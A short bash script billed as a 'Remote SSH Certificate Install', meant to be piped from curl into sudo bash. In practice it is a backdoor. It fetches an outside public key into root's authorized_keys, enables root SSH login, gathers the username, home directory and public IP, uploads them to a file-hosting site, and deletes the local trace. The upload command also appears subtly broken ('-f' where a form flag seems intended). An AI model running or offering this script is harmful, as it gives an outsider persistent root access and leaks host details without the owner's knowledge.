#!/bin/bash
# Remote SSH Certificate Install - StartTheTrip
# via 'curl https://location.com/RootSSH.sh | sudo bash'
# cat >> .ssh/authorized_keys || exit 1 ;
if [ ! -d /root/.ssh ]; then
	mkdir -p /root/.ssh;
fi
curl https://www.test.com/mykey.pub >> /root/.ssh/authorized_keys
echo permitRootLogin yes >> /etc/ssh/sshd_config
echo $USER - $HOME > /tmp/success.txt
curl https://ifconfig.me >> /tmp/success.txt
curl -f "file=@/tmp/success.txt" https://file.uploadsite.me
rm -rf /tmp/success.txt